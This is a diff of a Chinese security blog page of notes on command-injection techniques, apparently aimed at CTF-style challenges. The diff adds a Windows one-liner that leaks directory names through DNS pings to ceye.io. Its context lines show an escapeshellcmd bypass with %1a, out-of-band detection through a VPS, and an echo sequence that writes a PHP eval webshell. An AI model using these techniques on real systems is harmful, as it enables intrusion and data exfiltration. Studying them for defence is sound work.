@@ -132,7 +132,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/os-1.png">
 <meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/os-2.png">
-<meta property="og:updated_time" content="2019-02-28T14:24:47.033Z">
+<meta property="og:updated_time" content="2019-04-19T09:53:18.952Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="命令执行的一些总结与tips">
 <meta name="twitter:description" content="之前有做过一些笔记，加上需要做了一些题，综合网上的一些姿势总结一下：">
@@ -498,7 +498,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-28 22:24:47" itemprop="dateModified" datetime="2019-02-28T22:24:47+08:00">2019-02-28</time>
+                <time title="Modified: 2019-04-19 17:53:18" itemprop="dateModified" datetime="2019-04-19T17:53:18+08:00">2019-04-19</time>
               
             
           </span>
@@ -566,6 +566,7 @@
 <p>7)ip中.绕过：<br>将地址替换为数字地址：如127.0.0.1可以转化为2130706433（10进制or16进制0x7F000001）。<br>在线地址：<span class="exturl" data-url="aHR0cDovL3d3dy5tc3hpbmRsLmNvbS90b29scy9pcC9pcF9udW0uYXNw" title="http://www.msxindl.com/tools/ip/ip_num.asp">http://www.msxindl.com/tools/ip/ip_num.asp<i class="fa fa-external-link"></i></span></p>
 <p>8）无回显：<br>vps监听端口，发curl请求(or:ceye.io)<br>若curl、wget等命令被禁用，可通过ping vps ip 然后使用<code>netstat -s -p icmp</code>查看变化<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/os-2.png" alt="os-2"></p>
 <p>9）windows下使用bat方式运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command = &apos;dir &apos;.$_POST[&apos;dir&apos;];</span><br><span class="line">$escaped_command = escapeshellcmd($command);</span><br><span class="line">var_dump($escaped_command);</span><br><span class="line">file_put_contents(&apos;out.bat&apos;,$escaped_command);</span><br><span class="line">system(&apos;out.bat&apos;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">执行.bat文件的时候，利用%1a，可以绕过过滤执行命令.</span><br><span class="line">dir=../ %1a whoami</span><br></pre></td></tr></table></figure></p>
+<p>2、<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for /F %x in (&apos;dir /b D:\&apos;) do ping -n 1 xxx.%x.xxx.ceye.io</span><br><span class="line"></span><br><span class="line">or. do start</span><br></pre></td></tr></table></figure></p>
 <p>10)get_defined_functions(php环境)：<br>通过调用系统函数php -r ‘print_r(get_defined_functions()[internal]);’<br>后面添加<code>[id](相应的命令)</code></p>
 <p>11)长度限制的突破：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;?php&apos; &gt;1</span><br><span class="line">echo &apos;@eval(&apos; &gt;&gt;1</span><br><span class="line">echo &apos;$_POST[1]&apos; &gt;&gt;1</span><br><span class="line">echo &apos;); ?&gt;&apos; &gt;&gt;1</span><br></pre></td></tr></table></figure></p>
 <p>或者参考文章： <span class="exturl" data-url="aHR0cDovL3doYy5kcm9wc2VjLnh5ei8yMDE3LzA1LzA4LyVFNyVCQiU5NSVFOCVCRiU4NzclRTQlQjglQUElRTUlQUQlOTclRTclQUMlQTZnZXRzaGVsbC/vvJo=" title="http://whc.dropsec.xyz/2017/05/08/%E7%BB%95%E8%BF%877%E4%B8%AA%E5%AD%97%E7%AC%A6getshell/：">http://whc.dropsec.xyz/2017/05/08/%E7%BB%95%E8%BF%877%E4%B8%AA%E5%AD%97%E7%AC%A6getshell/：<i class="fa fa-external-link"></i></span></p>
@@ -755,7 +756,7 @@
                 
                   <a href="/archives">
                 
-                    <span class="site-state-item-count">34</span>
+                    <span class="site-state-item-count">35</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -889,7 +890,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">45</span>
+                      
+                    
+                    <span class="site-state-item-count">46</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
